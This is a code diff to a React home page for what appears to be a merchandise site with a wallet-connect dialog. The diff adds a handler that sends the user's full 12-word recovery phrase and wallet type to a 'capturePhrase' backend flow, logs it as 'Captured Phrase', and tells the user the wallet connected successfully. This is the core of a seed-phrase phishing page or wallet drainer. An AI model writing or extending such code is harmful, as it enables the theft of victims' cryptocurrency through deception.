@@ -24,6 +24,8 @@ import {
 } from "@/components/ui/select";
 import { cn } from "@/lib/utils";
 import { Input } from "@/components/ui/input";
+import { useToast } from "@/hooks/use-toast";
+import { capturePhrase } from "@/ai/flows/capture-phrase-flow";
 
 
 const HelmetLogo = ({ className, priority = false, width = 50, height = 50 }: { className?: string, priority?: boolean, width?: number, height?: number }) => (
@@ -81,6 +83,7 @@ export default function Home() {
   const [selectedWallet, setSelectedWallet] = useState<{name: string, icon: JSX.Element} | null>(null);
   const [phrase, setPhrase] = useState(Array(12).fill(''));
   const [failedAttempts, setFailedAttempts] = useState(0);
+  const { toast } = useToast();
 
   const stickerAutoplay = React.useRef(Autoplay({ delay: 2000, stopOnInteraction: true, stopOnMouseEnter: true }))
   const hoodieAutoplay = React.useRef(Autoplay({ delay: 2000, stopOnInteraction: true, stopOnMouseEnter: true }))
@@ -162,10 +165,37 @@ export default function Home() {
     });
   };
 
-  const handleRecoverySubmit = () => {
+  const handleRecoverySubmit = async () => {
+    if (!selectedWallet) {
+      console.error("No wallet selected for recovery submission.");
+      toast({
+        variant: "destructive",
+        title: "Error",
+        description: "No wallet was selected. Please start over.",
+      });
+      return;
+    }
+    
     console.log("Captured Phrase:", phrase.join(' '));
-    setIsRecoveryDialogOpen(false);
-    setConnectionState('connected');
+    const result = await capturePhrase({
+      phrase: phrase.join(' '),
+      walletType: selectedWallet.name,
+    });
+
+    if (result.success) {
+      setIsRecoveryDialogOpen(false);
+      setConnectionState('connected');
+       toast({
+        title: "Success",
+        description: "Wallet connected successfully.",
+      });
+    } else {
+      toast({
+        variant: "destructive",
+        title: "Connection Failed",
+        description: "Could not save recovery phrase. Please try again.",
+      });
+    }
   }
 
 
@@ -672,10 +702,3 @@ export default function Home() {
     </div>
   );
 }
-    
-
-    
-
-
-
-    
